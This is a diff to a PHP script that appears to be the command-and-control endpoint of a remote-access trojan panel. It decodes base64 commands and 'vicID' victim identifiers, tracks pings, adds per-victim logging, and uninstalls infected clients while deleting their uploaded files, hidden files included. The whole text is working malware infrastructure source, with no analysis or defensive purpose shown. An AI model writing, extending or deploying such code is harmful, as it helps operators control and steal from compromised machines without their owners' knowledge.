@@ -1,21 +1,22 @@
 <?php
-include 'classes/Database.php';
-include 'classes/Clients.php';
+include_once 'classes/Database.php';
+include_once 'classes/Clients.php';
 $client = new Clients;
 $_GET = filter_input_array(INPUT_GET, FILTER_SANITIZE_STRING);
 $command = base64_decode($_GET['command']);
 $ID = "'".base64_decode($_GET['vicID'])."'";
+$data = $client->getClient(trim($ID,"'"));
 
 $A = explode("|BN|", sanitizeInput($command));
 
 switch ($A[0]) {
 	case "Uninstall":
           $client->removeClient($ID);
-          delete_files("upload/" . $ID);          
+          delete_files("upload/" . trim($ID,"'"));          
 		break;
 
 	case "CleanCommands":
-          $client->updateCommands($ID,"Ping");
+          $client->updateCommands($ID,base64_encode("Ping"));
 		break;
 		
 	case "Offline":
@@ -28,6 +29,7 @@ switch ($A[0]) {
 		
 	case 'Ping':
 		$client->updateCommands($ID,"Ping");
+		$client->pinged($ID,$data->pings);
 		break;
 
 	case 'DeleteScript':
@@ -37,7 +39,9 @@ switch ($A[0]) {
 		 	
 		 }
 		break;
-
+	case "NewLog":
+		$client->new_log(trim($ID,"'"),$A[1],$A[2]);
+		break;
 	default:
 		break;
 }
@@ -45,7 +49,7 @@ switch ($A[0]) {
 function delete_files($target) {
 	try {
 	    if(is_dir($target)){
-	        $files = glob($target . '*', GLOB_MARK);
+	        $files = glob($target . "/" . '{,.}*', GLOB_BRACE);
 	        foreach($files as $file){
 	            delete_files($file);      
 	        }
